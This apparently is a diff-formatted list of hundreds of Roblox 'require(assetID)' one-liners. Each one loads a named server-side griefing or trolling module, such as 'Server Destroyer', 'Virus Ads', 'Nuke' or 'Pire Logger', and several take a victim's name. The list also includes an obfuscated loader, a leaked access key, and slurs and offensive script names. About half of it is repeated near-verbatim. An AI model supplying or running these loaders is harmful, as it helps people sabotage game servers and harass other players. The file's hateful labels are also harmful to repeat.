+require(5275752166).ULTRAV2("urnamehere") - Ultra Hub
+
+require(5178605206).bizzcrack("urnamehere") - Xio Hax
+
+require(5300095496).soap("urnamehere") - Soap Hub
+
+require(5142574517):mega("urnamehere") - Adrian’s MTG
+
+require(5203976741).spong("urnamehere") - Spong Hub
+
+require(5116049830).thonk("urnamehere") - Thonk Hub
+
+require(5253172143).load("urnamehere") - Forest hub
+
+require(3563652201).l0l("UltraWasHere")("urnamehere") - Plane
+
+require(5885462965).lexa("urnamehere") - L3xa Hub
+
+require(6216675632).ae("urnamehere") - Snake Glitcher
+
+require(4125860484)("urnamehere") - idk
+
+require(0x23F530165 - 0x17D6F549B).c3("urnamehere") - Banisher?
+
+require(6239870794):NB2("urnamehere") - NB Hub V2
+
+require(4869013426).JuanaSS("urnamehere") - JuanSS
+
+require(6253147982).SBV4("urnamehere") - Snake Banisher V4
+
+require(tonumber(require(1.9988474659215096e+24/389489894389289).dec("MHgxNmFmNzViMjA="))).tortillaload("urnamehere") - Dimension Hub
+
+require(3024043748):Start("urnamehere","AAA") - Gear Stuff
+
+require(6234345495):Tesla("urnamehere") - Tesla Executor
+
+require(6269838898).load(urnamehere) - Operation Noob
+
+require(6171421519)("urnamehere") - Epic Godcat Edit
+
+require(6274987259).v2("urnamehere") - Project Scripted V2
+
+require(5994869968).D0ggo("urnamehere") - Lucky's Hub
+
+require(4496865792).Lmao("urnamehere") - Ultimate Trolling Gui Youtube Edition
+
+require(4813227802){"urnamehere"} - PikaX UTG
+
+require(5716300544).asd("urnamehere") - Kaspers Hub
+
+require(5203976741).spong("urnamehere") - Spong Hub
+
+require(5654587719).brohhh(string.reverse("urnamehere")) - Old Lightning Cannon
+
+require(4559977647).load("urnamehere") - Baseball Bat V5
+
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - Poo Pee Stinky Hub
+
+require(5133347890).scrambles("urnamehere") - Scrambles Hub
+
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - An OP Script Hub
+
+require(5098133040):FirePire("urnamehere:Pire") - Pire Logger
+
+require(6032524768).Eagle('urnamehere') - C00lgui Reborn
+
+require(6370978733)("urnamehere") - Lightning Cannon V2
+
+require(6270014162).load("urnamehere") - Universalis Dominus
+
+require(6419718698).load("urnamehere") - The Holiest Wrench
+
+require(6285853184).TimeStopper("urnamehere","rbc") - Time Stop
+
+require(6339079111).mobspawner("YourNameHere") - Minecraft Mobs Spawner
+
+require(6464428559).load("urnamehere") - Dominus Astra
+
+require(6438196691)("urnamehere","JUNKBOT") - Junkbot ( Q, Z, R, X, C, V, E )
+
+require(5813748809).load("urnamehere") - Light Circlet ( E, T, Z, X, C, V, B, M )
+
+require(6424791174).load("urnamehere") - Gattai Zamasu ( E, R, T, Y, U )
+
+require(6335063396).load("urnamehere") - Supr14 Nuke
+
+require(3032735551):Start("urnamehere","AAA") - Calamity
+
+require(6472943749).boss("urnamehere") - Bloxwatch
+
+require(6649537798).UniverseReset() - Universe Reset
+
+require(6564964464)("urnamehere") - Moriyan Drone ( Z, M )
+
+require(6569726017)["urnamehere"] = "Dark"; - Hellset
+
+require(6540522165).load("urnamehere") - Omni God
+
+require(6549414661) - Troll Server Destroyer
+
+require(6218862474).eliza("urnamehere") - UTG V10
+
+require(5223007262)("VictimName") - Wario Apparition
+
+require(6525681614).reverser("urnamehere") - Reverse Time
+
+require(6707668066).virus("urnamehere") - Virus Ads
+
+require(6688474792).load("urnamehere") - Killbot V3
+
+require(6583572269).load("urnamehere") - idk
+
+require(1071722458).load("urnamehere") - Lightning Cannon UTG
+
+require(6794297504).NekoHub("urnamehere") - Neko Hub
+
+require(4081020916).loadmap() - Tanitive Space Map
+
+require(4081024299).loadmap() - Dungeon Map
+
+require(6746870700)() - Praise Server Destroyer
+
+require(6745275731)() - Nulled XD
+
+require(7158847523).lewfoqfockwroewopqrqwxowpr("urnamehere") - Hyperskidded Cannon Max
+
+require(1463699117).Load("urnamehere") - Ultra God Lightning Cannon ( L, K, G, U, Y, T, M, Z, X, C, V, I, F )
+
+require(6287712657).Load("urnamehere") - Ultraskid Cannon
+
+require(3183152719)(game:GetService("Players"):WaitForChild("urnamehere").UserId) - Ultraskidded Lord
+
+require(7197738360)"UNKN0WN" - Unknown Lord
+
+require(6885716335)("urnamehere") - Ultraskidded Studio Dummy V2
+
+require(6788546558)("urnamehere") - Studio Dummy V3
+
+require(6824699886)("urnamehere") - Studio Dummy V3 Switcher
+
+require(7091286913)("urnamehere") - Newest Maddox Dummy
+
+require(6903927432)(65464593) - Anti V7 ( F, G, Z, X, C )
+
+require(7229827459).TotallyYessir23231212("urnamehere") - Legend Skidded Echo
+
+require(6522699963)("urnamehere") - Mat LC
+
+require(7054321111).SC("urnamehere") - Anatomiiii Cannon V.3 (terrible)
+
+require(6568426115)("urnamehere") - Rapid Fire Studio Dummy
+
+require(6931315732).yeah("urnamehere") - AndrFix Godcat Edit
+
+require(7242244455)("urnamehere") - Immortality Lord XTR
+
+require(7161308644).lc("urnamehere") - Shrike LC
+
+require(6608656220):John("urnamehere") - New John Doe
+
+require(7001260635).lctoolsreuploaded("urnamehere") - LC Tools Pack
+
+require(7037589092)("urnamehere") - Weird Lord
+
+require(7023682644)("urnamehere") - IL Dummy
+
+require(7242662591):SGH_3("urnamehere") - Sans_Gboard’s Hub (OP!)
+
+require(7253448613)("urnamehere") - Studio Immortality Lord V2
+
+require(6799359169)("urnamehere") - Hyperskidded Lord
+
+require(6727030812).Fun("urnamehere", "Fun") - Tools Pack
+
+require(7203746402).tonk("urnamehere") - Tank AI
+
+require(7215403029).RRT("urnamehere") - Special Forces AI
+
+require(7185228601).load("urnamehere") - Helicopter AI
+
+require(0x1767bf813)("urnamehere") - C4 Weapon
+
+require(7163976217).VK("urnamehere") - Police AI
+
+require(7486656912).Juggernaut("urnamehere") - Juggernaut AI
+
+require(3957090799).load("urnamehere") - Godspeed
+
+require(7414960182).load("urnamehere") - The Dark Entity
+
+require(7437496726).load("urnamehere") - Lucyanna Angel
+
+require(6888054758)(game:GetService("Players")["urnamehere"]) - Gregorian (NO) GUI
+
+require(7411835387) ("VictimNameHere") - The Time Machine
+
+require(7322088685)("urnamehere”) - Immortality Demon
+
+require(6530368992).antilgr() - Anti ScriptLogger/WebhookLogger
+
+require(7276744247):noskids("urnamehere") - Logger Detector
+
+require(7485724079)(65464593) - Dark Skidded Lord
+
+require(7485376670).trussboy("urnamehere") - The Ascensionist
+
+require(7475656586).bscr("urnamehere") - Project Godcat
+
+require(7265631746):SGHR("urnamehere") - Sans_Gboard Hub Remake
+
+require(7064628940).TLX("urnamehere") - Tiger's Lamborghini Type-X
+
+require(7380893117).HSBW("urnamehere") - Hyperskidded Bloodwater Edit
+
+require(7452827346):NEFFEXV2("urnamehere") - Neffex V2
+
+require(7077641377).SSB("urnamehere") - Super Skidded Banisher
+
+require(7103633176)("urnamehere”) - Some Random Tool Pack
+
+require(6526438357).HSC("urnamehere") - Hyper Skidded Cannon XSE
+
+require(7594500378)("urnamehere") - Nightmare
+
+require(7593715162).load("urnamehere") - Calamity V3 (Hub)
+
+require(7593452166).exodim("urnamehere") - Exodim LC
+
+require(7601446307):SDIK("urnamehere") - Studio Immortality King
+
+require(7584808965).ImmortalityLord("urnamehere") - Incubus (Neko Edit)
+
+require(7575478789)"v1.6.1" - Hyper Skidded Godcat 1.6.1
+
+require(7141234250).molten("urnamehere") - Molten Banisher
+
+require(tonumber("7564007780")).e(string.reverse(string.reverse("urnamehere"))) - Ultraskidded Glitcher
+
+require(6710125107).mlem("urnamehere") - Mlem’s SS Gui V3 (OP)
+
+require(6655953122).HopeV2iguess("urnamehere") - Hope V2
+
+require(7185139799).bal("urnamehere") - Maddox Ball Script (LOL)
+
+require(7664181817)("urnamehere") - Bloodwater Edit
+
+require(7674895345)("urnamehere") - The Ascensionist
+
+require(7662310890)("urnamehere") - Ultraskidded Amongus
+
+require(7661712858).Load("urnamehere") - Ultraskidded Cannon X
+
+require(7691779364).hi("urnamehere") - Hallowed
+
+require(7701211784).rar("urnamehere") - Another Toolpack Script
+
+require(7580799842).NONAME("urnamehere") - Viewport Bloodwater
+
+require(7710841241).HoneyLCX("urnamehere") - Honey LC Overdrive
+
+require(7705282521).lc("urnamehere") - Shrike LC
+
+require(7146067831).katas({Player = "urnamehere", Skid=true}) - Katasrophe LC
+
+require(7133882046).Soul(string.reverse("urnamehere") - Lost Cannon
+
+require(7722155314)("urnamehere") - Unknown Demon (SD Edit)
+
+require(7703246385).NONAME("urnamehere") - New Viewport Bloodwater
+
+require(7078449501).MOTHERFUCKER("urnamehere") - U?N?K?N?O?W?N
+
+require(7759895257).Load("urnamehere") - Omega Skidded Cannon
+
+require(6526438357).TUSC("urnamehere") - Hyper Skidded Cannon XSE (Newest Version)
+
+require(7781347277)("urnamehere") - Redone Ultraskidded Lord
+
+require(8065511782)("urnamehere") - Descensionist
+
+require(6740182305):myfirstscriptthatcankilllol("urnamehere") - Over powered tool pack
+
+require(7819171999).antilgr() - Anti Logger V10
+
+require(6735691273).BetaAntiSkid() - Antiskid V10
+
+require(7628024907).LoadAdmin("urnamehere") - Anti V13 (Anti Universal V3)
+
+require(0x20c40e721):NekoHub("urnamehere")
+
+require(4753224196).load("urnamehere")
+
+require(7518778955).ConstraintTools("urnamehere")
+
+require(6795333966).enableWeapons("urnamehere")
+
+require(7207263079).nekogui("urnamehere")
+
+require(5133347890).scrambles("urnamehere")
+
+require(6460913193).load("urnamehere")
+
+require(6953710832):ToolPack_Gui_by_Sans_Gboard("urnamehere")
+
+require(5487274946).GLITCHED("urnamehere")
+
+require(5419240318).PraiseSkidGod("urnamehere")
+
+require(6525681614).reverser("urnamehere")
+
+require(7507987223)("urnamehere","Guns")
+
+require(7960756691).load("urnamehere")
+
+require(6269838898).load("urnamehere")
+
+require(5239955586).Dark("urnamehere")
+
+require(4105428725).load("urnamehere")
+
+require(5193737424)("urnamehere",false)
+
+require(5564800243).fehax("urnamehere")
+
+require(5127730212)("urnamehere")
+
+require(5673170715).Leak("urnamehere")
+
+require(6847914535).Hentai("urnamehere")
+
+require(4745872847).load("urnamehere")
+
+require(6569468935).load("urnamehere")
+
+require(6342893088).load("urnamehere")
+
+require(2505714651).fuc("urnamehere","Victm")
+
+require(4824650327).Best("urnamehere") key:4CPRK-NM3K3-X6XXQ-RXX86-WXCHW --Anonymous UTG
+
+require(4744981474).adrian("urnamehere") --adrian trolling gui
+
+naughty n word ss: require(4772620524):nig("nicholast013")
+
+-- its auto update slight_smile
+
+-- Road Roller da script
+
+require(4581300009).xd("nicholast013")
+
+require(4763495676):Fire("urnamehere") --Ultimate Trolling SS u/ULTIMATE DIO credit to him
+
+require(4761634134):Fire("urnamehere") --Black SS
+
+UNDERS utg: require(4276916304):Fire("urnamehere") PASS: DevKey
+
+Black man's GUI: require(4746910205):UTG("urnamehere")
+
+Utg v3: require(4675430277).Lmao("urnamehere")
+
+Nuke: require(4530627975):Fire("urnamehere")
+
+Unleak: require(4706570992).load("urnamehere")
+
+Non premium scripts:
+
+Island life utg: require(4588615641):Fire("urnamehere")
+
+Aureus hub: require(4679893299):Fire("urnamehere")
+
+Drahazar: require(4528687560):LMAFO("yournamehere")
+
+Many gui: require(4721164458).copy("urnamehere")
+
+Bean GUI: require(4649145907).oCAG("urnamehere")
+
+require(4798155942):Fire("urnamehere") felipe in it
+
+require(4798150799).Lmao("urnamehere") new utg
+
+-- A UPDATED This its NEW file Where u can find premium script if u leak u are ban or demote
+
+Reality orb:require(4780399515).load("urnamehere")
+
+require(4748605382).new("urnamehere") -ruby utg
+
+Anonymous UTG: require(4817568691).Best("urnamehere") key:4CPRK-NM3K3-X6XXQ-RXX86-WXCHW
+
+robio viruses: require(4821018129).Virus("urnamehere")
+
+ro bio injector:require(4821022303).Inject("urnamehere")
+
+require(4748605382).new("urnamehere") --ruby utg
+
+require(4722218391).load("urnamehere") -- Infinte Glitcher
+
+require(4722146433).load("urnamehere") -- Interstekkar Glitcher
+
+require(4721766508):GalaxyGlitcher("urnamehere") -- Cytus Glitcher
+
+Pixel Glitcher: require(4178465932).MPG("urnamehere")
+
+require(4721735759).load("urnamehere") --Spectrum Glitcher
+
+require(4721760220):yes("urnamehere") --AOM Glitcher Edit
+
+require(4721789462).noxd("urnamehere") --Reality Glitcher
+
+spectrum glitcher wokring: require(2844773931).load("urnamehere")
+
+reality orb : require(4780399515).load("urnamehere")
+
+require(4809720017).load("urnamehere") --axiom glitcher
+
+last add require(4809720017).load("urnamehere") --axiom glitcher
+
+require(4809742472).load("urnamehere") --apectrum
+
+require(4809749920).load("urnamehere") --sapdm
+
+require(2505714651).fuc("Your Name","Victm") RP Gui Quantom Rewritten (Press P for commands) - require(3048207279):Fire('kermitwashere,ok','Just_Basical') game.Players.Just_Basical.PlayerGui.JOHNDOE.ResetOnSpawn = false prevent john doe ss from closeing SS Executer: require(4472441106):cube("Just_Basical") require(3380379652):Fire("Just_Basical") Ultimate Trolling Gui require(3117546674):Fire('Just_Basical') script for Gunjourer require(3117564747):Fire('Just_Basical') script for Magic Power require(3117661544):Fire('Just_Basical') script for Dual Ultima require(3117669110):Fire('Just_Basical') script for a Titan (broken) require(3117679218):Fire('Just_Basical') script for god and bad cop require(3117682928):Fire('Just_Basical') script for Glitch Master require(3117687124):Fire('Just_Basical')script for Brutal Overlord require(3117694773):Fire('Just_Basical') script for ??? require(3117697757):Fire('Just_Basical') script for ??? require(3117706978):Fire('Just_Basical') script for Nebula (borken) require(3117712774):Fire('Just_Basical') script for ??? require(3117717032):Fire('Just_Basical') script for John Wik require(3117721105):Fire('Just_Basical') script for Karmapange require( 3117724565):Fire('Just_Basical') script for ??? require(3117564747):Fire('Just_Basical') script for Magic power require(2681865333):Fire('ok', 'Just_Basical') script for grab Knive V4 Grab Knife V1: require(2836693511):Fire('Just_Basical','i baked you a pie') Grab Knife V2: require(2845941230):Fire('Just_Basical','i baked you a pie') Grab Knife V3: require(2829943043):Run('Just_Basical','i baked you a pie') ShotGun - require(03114598550):Fire("Just_Basical") Matteo's gun - require(03099649438).load("Just_Basical") Rare Sword - require(03099697999).load("Just_Basical") Rainbow Titan - require(03099691224).load("Just_Basical") Matteo's Flamethrower - require(03099659288).load("Just_Basical") Eraser - require(03099667517).load("Just_Basical") Vape - require(03099678440).load("Just_Basical") Dualecider - require(2790149731):Run('Just_Basical') Scary ambient(by me lol) - require(03099579132).load("Just_Basical") lOsT hOpE - require(3098076859).load("Just_Basical") Lost Bye Bye - require(03099474099).load("Just_Basical") You are an idiot - require(03095188600).load("Just_Basical") kys - require(03095160836).load("Just_Basical") Mexican/Russian doge- require(3095125182).load("Just_Basical") YOU NEED JESUS - require(3086965141):executeModule("Just_Basical") Mr.Pixels - require(2995020929):Fire("oof","Just_Basical) require(03095105955).load("Just_Basical") Pizza Guy - require(02980464351).load("Just_Basical") Moonman (KKK) - require(03095022841).load("Just_Basical") SS GUI - require(03090163777).load("Just_Basical") UTG GUI - require(2993514878):Fire("Just_Basical") A GUI - require(3058559294).load("Just_Basical") Darth Vader - require(02980473200).load("Just_Basical") Drunk Guy - require(03087849096).load("Just_Basical") Purple Guy - require(03087845888).load("Just_Basical") Ice Cream - require(3087708111).load("Just_Basical") wHAT ANOTHER ONE - require(03029193386):Fire("Just_Basical") Elo Blasio - require(2891645338).sans('undertale','"Just_Basical") Jojo Boie - require(3034302901):Fire("Just_Basical") WYD - require(2851043168).load("Just_Basical") TopKEK - require(2609384717).load("Just_Basical") My executor - require(3084491250).load("Just_Basical") Unanchor all - require(03066959022):Fire("Just_Basical") PUBG Pan - require(03078332852):Fire("Just_Basical") Insanity (C Throw head | T omg) - require(2787111216):Run('Just_Basical') SworD OmGG!11 - require(2972237186).load("Just_Basical")
+
+require(5802346180).eliza(urnamehere) - EARRAPE
+
+require(7260532691)("urnamehere") - Huge Lord
+
+require(5802335492).eliza(urnamehere) - LOLOLOLOL
+
+require(4832967293):Fire("urnamehere") - NUKE GUI
+
+require(5610305900)("urnamehere") - TOPKEK V5
+
+require(4874364435)("urnamehere") - TOPKEK V4
+
+require(5034863407).subtosyntax64("urnamehere") - NOOT NOOT
+
+require(5115793531).scare(urnamehere) - Something From Spongebob Server Destroyer
+
+require(5564800243).fehax("urnamehere") - CHATHAX
+
+require(5903403087).load("urnamehere") - IMPOSTER CHAT
+
+require(5617600468).load("urnamehere") - Neurotic
+
+require(5193737424)("urnamehere",true) - ULTRA NOOB SPAMMER
+
+require(1192815372).load'urnamehere' - RANDOM MAP
+
+require(5621190626).OmegaFlower("urnamehere") - OMEGA FLOWEY
+
+require(4106669917).load("urnamehere") - Chara Boss
+
+require(4483948796).load("urnamehere") - Pyro Flamethrower
+
+require(4581300009).xd("urnamehere") - RODA ROLLA DA
+
+require(4178274460).Nuke(Vector3.new(urnamehere),1000) - NUKE
+
+require(4564681456).catgirl(urnamehere) - CATGIRL TROLL
+
+require(4124996597).swano(urnamehere) - AD Virus
+
+require(4024051473).call("all") - Builderman Discord Call
+
+require(5257685661):Fire("urnamehere") - Server Destroyer GUI
+
+require(4937823608).load("urnamehere") - UTG
+
+require(4945821345).lmao("urnamehere") - UTG Epix
+
+require(5673170715).Leak("urnamehere") - Undetected Hub V2
+
+require(5099140412).Aqua("urnamehere") - Aqua Hub
+
+require(5492934148):Fire("XD","urnamehere") Mr Bean Admin
+
+require(4863172339).Enduro("urnamehere")- Rape Gui
+
+require(5160216694).Ass("urnamehere") - Project Scripted GUI
+
+require(4937114966):SH("urnamehere") - Sakura Hub
+
+require(5516943300).Leak("urnamehere") - Undetected Hub V2
+
+require(4934614538):adrian("urnamehere")- Adrian’s Good UTG
+
+require(4977590940).load("urnamehere") - baldiinvasion2’s utg
+
+require(5868025435).load("urnamehere") - D3S SS
+
+require(5028947792).Lmao("urnamehere") - Hoarder GUI
+
+require(5098731275).eliza("orangeado") - Epic Stand
+
+require(4902600443)("Stand Name", "urnamehere") - Jojo Stands
+
+require(5702333343).load("urnamehere") - Roz Hub
+
+require(5845339294).EH("urnamehere") - Ethereal Hub
+
+require(5128274968).GetAntsUtgV5("urnamehere") - Ants Hub V5
+
+require(4831353616).xh("urnamehere") - Xio’s Hub
+
+require(4634558715)("urnamehere") - Best Hub
+
+require(5356256564).SubscribeYouSkid("urnamehere") - Subhub
+
+require(5419240318).PraiseSkidGod("urnamehere") - Hexine Gui
+
+require(4829576129).SpringHub("urnamehere") - Spring Hub
+
+require(4706570992).load("urnamehere") - Unleaked SS
+
+require(5121570975).SpaghettiHub("urnamehere") - Spaghetti Hub
+
+require(5705720748).Lightning(string.reverse("urnamehere")) - Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(5620645578):ASH("urnamehere") - Adrian Hub
+
+require(5580599015).load("urnamehere") - Avry Hub
+
+require(5098133040):FirePire("urnamehere:Pire") - Pire Hub
+
+require(5487274946).GLITCHED("urnamehere") - Glitchhub Premium
+
+require(5126648745).load("urnamehere") - Anonymous UTG
+
+require(4614455084).Under("urnamehere") - Under UTG
+
+require(5352721272):Fire("urnamehere") - Sonichub
+
+require(3497222070).load("urnamehere") - UTG Edit
+
+require(5828128589).honey(string.reverse("urnamehere")) - Zero Two Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(5970690882).ps1("RICKLER”) - Fearful Harmony
+
+require(5226367856).rk("urnamehere") - Super Cool Banisher
+
+require(4952179933).Fraud("urnamehere") - Fraud
+
+require(5963380437).publicbuild("urnamehere", "Retro") - Retro Hub
+
+require(6009547419).Fire("urnamehere") - Vascepa Hub
+
+require(5543125369).eliza("urnamehere") - Eliza Hub
+
+require(6062281254).load(urnamehere) - South Park Video Troll
+
+require(6036737823).CrackedByIncreaseron("imlucixD34") -Aureus V1
+
+require(6085762856).BINGBONG("NoNameNeeded") - Crab Rave
+
+require(5597042098).chinaAnnounce("urnamehere") - Xi Jinping
+
+require(3010581956):Fireplace("urnamehere") - Dark Dex
+
+require(4867426485):SD2("urnamehere") - Cooldown Nuke
+
+require(6088717643)("65464593") - Immortality Lord ( Z, X, Q, F, C )
+
+require(6123029966).vian("urnamehere") - Viankos ( F, Z, X, C)
+
+require(5856873964).PharaohCannon(string.reverse("urnamehere")) - Pharaoh Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(4658687827).nukes("urnamehere") - The End Nuke
+
+require(4555115496).gw("urnamehere") - Trollimbius Gui
+
+require(4154130567).ik("urnamehere") - Adrian’s UTG
+
+require(4967804765).SBV3("urnamehere") - Snake Banisher V3
+
+require(4903995654)(65464593) - Immortality Cannon ( E, Q, R, G, F, T, K, M )
+
+require(4992512410):Asylumgotskidded("urnamehere") - Asylum Hub
+
+require(6114289913).c00lgui("urnamehere") - c00lgui remake
+
+require(5308680571).load("urnamehere") - GUI Hub
+
+require(4813227802){"urnamehere"} - PikaX UTG
+
+require(0xA8526D5D).giveGuns'urnamehere'- Phantom Forces Guns
+
+require(5146396793).load("urnamehere") - GodSpawn GUI
+
+require(5344766102).fare("urnamehere") - Fare’s Hubhub
+
+require(6097532439):redlightsdontleak("urnamehere") - Redlights.exe
+
+require(6099373575).load("urnamehere”) - Ravenger Claws V2 ( Q, E, R, Y )
+
+require(6222361140).load("urnamehere”) - Shadow Gunner ( T, Z, X )
+
+require(6027795939).load("urnamehere") - Cyber Monarch
+
+require(6099324864).load("urnamehere") - Kuma ( Q, E )
+
+require(4471066396).load("urnamehere") - Bad Karma
+
+require(6175490752).load("urnamehere”) - Void Boss ( Z, X, C, V )
+
+require(6099241563).load("urnamehere") - Xester V2 ( E, R, T, G, Z, M, Y, F, Q, E, R, Y, G )
+
+require(6099316092).load("urnamehere") - Veltex ( Q, E, T, F, J )
+
+require(6058159336).load("urnamehere") - Shadow Kars
+
+require(6168743245).load("urnamehere") - The Defiant
+
+require(6099363076).load("urnamehere") - The Disturbed ( Q, E, Y, F )
+
+require(6042859321).load("urnamehere") - Jester ( T, Z, X, V )
+
+require(6058166660).load("urnamehere") - Dimensiona
+
+require(4665394711).load("urnamehere") - Server Admin
+
+require(3224070083).load("urnamehere") - Nectula ( T, G, Z, X, V
+
+require(6088494183).load("urnamehere") - Desolate ( R, F, M )
+
+require(6015747481).load("urnamehere") - Brick Hamman
+
+require(5619264516).Dark("urnamehere") - Vaxtemi Boss Battle
+
+require(6056559552).load("urnamehere") - Death Sheriff
+
+require(6027832941).load("urnamehere") - Holy Hand Grenade
+
+require(5813743814).load("urnamehere") - Stick Beater ( Z, X, C )
+
+require(5977500481).load("urnamehere") - Project Light
+
+require(5813695241).load("urnamehere") - Oculus ( Z, X, C, V, M )
+
+require(5617200606).Cyber("urnamehere") - Cyber Knight
+
+require(5390158029).Dark("urnamehere") - Lost Soul ( Q, J, H, G, F, Z, X, C, V, B, SHIFT )
+
+require(5857033951).load("urnamehere") - Achromatic ( M, C, V, Z, NUMBERS )
+
+require(5813836873).load("urnamehere") - Archangel of Light ( Z, X, C )
+
+require(5813799887).load("urnamehere") - Aureola ( NUMBERS, Z )
+
+require(4229413153).load("urnamehere") - Aether Lightning
+
+( CTRL, Q, E, R )
+
+require(5751710030).Sun("urnamehere") - Deadly Laser Sun V3
+
+require(4611999946).load("urnamehere") - Sociopath
+
+require(4490557105).load("urnamehere") - Fallen Anger
+
+require(5068511197).insert("urnamehere") - Military Tank
+
+require(4661847142).load("urnamehere") - Chronos Sentinel
+
+require(5375460203).Player("urnamehere") - Glorious Bastion of Light
+
+require(5605396200):load("urnamehere","Felipe") - Felipe’s Ascension
+
+require(5374597845).Dark("urnamehere") - Echo
+
+require(5346891374).Dark("urnamehere") - Darkomos
+
+require(5270525643).Dark("urnamehere") - Stan ( E, Q )
+
+require(4943481014).Nightmare("urnamehere") - Nightmare ( Q, Z, M )
+
+require(3256686965).load("urnamehere") - Dominus Venari ( Q, T, Z, X, C, V, B, K )
+
+require(5146659840).Dark_Eccentric("Dark_Eccentric", "urnamehere") - Grab Gun ( Z, C, M, G, Q, E, V, N, X )
+
+require(5239955586).Dark("urnamehere") - Siren Head
+
+require(5000363317).UwUMoment("urnamehere") - Kasper Hub
+
+require(4869378421).F3X("urnamehere") - F3X BTools
+
+require(5275752166).ULTRAV2("urnamehere") - Ultra Hub
+
+require(5178605206).bizzcrack("urnamehere") - Xio Hax
+
+require(5300095496).soap("urnamehere") - Soap Hub
+
+require(5142574517):mega("urnamehere") - Adrian’s MTG
+
+require(5203976741).spong("urnamehere") - Spong Hub
+
+require(5116049830).thonk("urnamehere") - Thonk Hub
+
+require(5253172143).load("urnamehere") - Forest hub
+
+require(3563652201).l0l("UltraWasHere")("urnamehere") - Plane
+
+require(5885462965).lexa("urnamehere") - L3xa Hub
+
+require(6216675632).ae("urnamehere") - Snake Glitcher
+
+require(4125860484)("urnamehere") - idk
+
+require(0x23F530165 - 0x17D6F549B).c3("urnamehere") - Banisher?
+
+require(6239870794):NB2("urnamehere") - NB Hub V2
+
+require(4869013426).JuanaSS("urnamehere") - JuanSS
+
+require(6253147982).SBV4("urnamehere") - Snake Banisher V4
+
+require(tonumber(require(1.9988474659215096e+24/389489894389289).dec("MHgxNmFmNzViMjA="))).tortillaload("urnamehere") - Dimension Hub
+
+require(3024043748):Start("urnamehere","AAA") - Gear Stuff
+
+require(6234345495):Tesla("urnamehere") - Tesla Executor
+
+require(6269838898).load(urnamehere) - Operation Noob
+
+require(6171421519)("urnamehere") - Epic Godcat Edit
+
+require(6274987259).v2("urnamehere") - Project Scripted V2
+
+require(5994869968).D0ggo("urnamehere") - Lucky's Hub
+
+require(4496865792).Lmao("urnamehere") - Ultimate Trolling Gui Youtube Edition
+
+require(4813227802){"urnamehere"} - PikaX UTG
+
+require(5716300544).asd("urnamehere") - Kaspers Hub
+
+require(5203976741).spong("urnamehere") - Spong Hub
+
+require(5654587719).brohhh(string.reverse("urnamehere")) - Old Lightning Cannon
+
+require(4559977647).load("urnamehere") - Baseball Bat V5
+
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - Poo Pee Stinky Hub
+
+require(5133347890).scrambles("urnamehere") - Scrambles Hub
+
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - An OP Script Hub
+
+require(5098133040):FirePire("urnamehere:Pire") - Pire Logger
+
+require(6032524768).Eagle('urnamehere') - C00lgui Reborn
+
+require(6370978733)("urnamehere") - Lightning Cannon V2
+
+require(6270014162).load("urnamehere") - Universalis Dominus
+
+require(6419718698).load("urnamehere") - The Holiest Wrench
+
+require(6285853184).TimeStopper("urnamehere","rbc") - Time Stop
+
+require(6339079111).mobspawner("YourNameHere") - Minecraft Mobs Spawner
+
+require(6464428559).load("urnamehere") - Dominus Astra
+
+require(6438196691)("urnamehere","JUNKBOT") - Junkbot ( Q, Z, R, X, C, V, E )
+
+require(5813748809).load("urnamehere") - Light Circlet ( E, T, Z, X, C, V, B, M )
+
+require(6424791174).load("urnamehere") - Gattai Zamasu ( E, R, T, Y, U )
+
+require(6335063396).load("urnamehere") - Supr14 Nuke
+
+require(3032735551):Start("urnamehere","AAA") - Calamity
+
+require(6472943749).boss("urnamehere") - Bloxwatch
+
+require(6649537798).UniverseReset() - Universe Reset
+
+require(6564964464)("urnamehere") - Moriyan Drone ( Z, M )
+
+require(6569726017)["urnamehere"] = "Dark"; - Hellset
+
+require(6540522165).load("urnamehere") - Omni God
+
+require(6549414661) - Troll Server Destroyer
+
+require(6218862474).eliza("urnamehere") - UTG V10
+
+require(5223007262)("VictimName") - Wario Apparition
+
+require(6525681614).reverser("urnamehere") - Reverse Time
+
+require(6707668066).virus("urnamehere") - Virus Ads
+
+require(6688474792).load("urnamehere") - Killbot V3
+
+require(6583572269).load("urnamehere") - idk
+
+require(1071722458).load("urnamehere") - Lightning Cannon UTG
+
+require(6794297504).NekoHub("urnamehere") - Neko Hub
+
+require(4081020916).loadmap() - Tanitive Space Map
+
+require(4081024299).loadmap() - Dungeon Map
+
+require(6746870700)() - Praise Server Destroyer
+
+require(6745275731)() - Nulled XD
+
+require(7158847523).lewfoqfockwroewopqrqwxowpr("urnamehere") - Hyperskidded Cannon Max
+
+require(1463699117).Load("urnamehere") - Ultra God Lightning Cannon ( L, K, G, U, Y, T, M, Z, X, C, V, I, F )
+
+require(6287712657).Load("urnamehere") - Ultraskid Cannon
+
+require(3183152719)(game:GetService("Players"):WaitForChild("urnamehere").UserId) - Ultraskidded Lord
+
+require(7197738360)["UNKN0WN"]("urnamehere") - Unknown Lord
+
+require(6885716335)("urnamehere") - Ultraskidded Studio Dummy V2
+
+require(6788546558)("urnamehere") - Studio Dummy V3
+
+require(6824699886)("urnamehere") - Studio Dummy V3 Switcher
+
+require(7091286913)("urnamehere") - Newest Maddox Dummy
+
+require(6903927432)(65464593) - Anti V7 ( F, G, Z, X, C )
+
+require(7229827459).TotallyYessir23231212("urnamehere") - Legend Skidded Echo
+
+require(6522699963)("urnamehere") - Mat LC
+
+require(7054321111).SC("urnamehere") - Anatomiiii Cannon V.3 (terrible)
+
+require(6568426115)("urnamehere") - Rapid Fire Studio Dummy
+
+require(6931315732).yeah("urnamehere") - AndrFix Godcat Edit
+
+require(7242244455)("urnamehere") - Immortality Lord XTR
+
+require(7161308644).lc("urnamehere") - Shrike LC
+
+require(6608656220):John("urnamehere") - New John Doe
+
+require(7001260635).lctoolsreuploaded("urnamehere") - LC Tools Pack
+
+require(7037589092)("urnamehere") - Weird Lord
+
+require(7023682644)("urnamehere") - IL Dummy
+
+require(7242662591):SGH_3("urnamehere") - Sans_Gboard’s Hub (OP!)
+
+require(7253448613)("urnamehere") - Studio Immortality Lord V2
+
+require(6799359169)("urnamehere") - Hyperskidded Lord
+
+require(6727030812).Fun("urnamehere", "Fun") - Tools Pack
+
